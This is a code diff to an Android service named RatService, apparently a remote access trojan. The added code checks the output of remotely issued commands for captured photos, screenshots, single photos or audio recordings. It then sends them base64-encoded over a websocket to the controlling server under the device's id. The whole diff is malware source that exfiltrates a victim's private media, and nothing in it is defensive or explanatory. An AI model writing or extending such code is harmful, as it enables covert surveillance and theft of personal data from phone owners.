@@ -153,6 +153,19 @@ public class RatService extends Service {
         Log.i(TAG, "Command: " + cmd);
         try {
             String result = Commands.execute(RatService.this, cmd);
+
+            // Проверяем — может это файл
+            if (result.startsWith("PHOTOS_ZIP|")
+                || result.startsWith("SCREENS_ZIP|")
+                || result.startsWith("PHOTO|")
+                || result.startsWith("AUDIO|")) {
+                String[] parts = result.split("\\|", 3);
+                if (parts.length == 3) {
+                    sendFile(cmd, parts[1], parts[2]);
+                    return;
+                }
+            }
+
             sendResult(cmd, result);
         } catch (Throwable t) {
             sendResult(cmd, "error: " + t.getMessage());
@@ -169,6 +182,21 @@ public class RatService extends Service {
             if (ws != null) ws.send(obj.toString());
         } catch (Throwable t) {
             Log.e(TAG, "sendResult error", t);
+        }
+    }
+
+    private void sendFile(String cmd, String filename, String base64) {
+        try {
+            JSONObject obj = new JSONObject();
+            obj.put("type", "file");
+            obj.put("id", myId);
+            obj.put("cmd", cmd);
+            obj.put("name", filename);
+            obj.put("data", base64);
+            if (ws != null) ws.send(obj.toString());
+            Log.i(TAG, "File sent: " + filename + " (" + base64.length() + " b64)");
+        } catch (Throwable t) {
+            Log.e(TAG, "sendFile error", t);
         }
     }
 
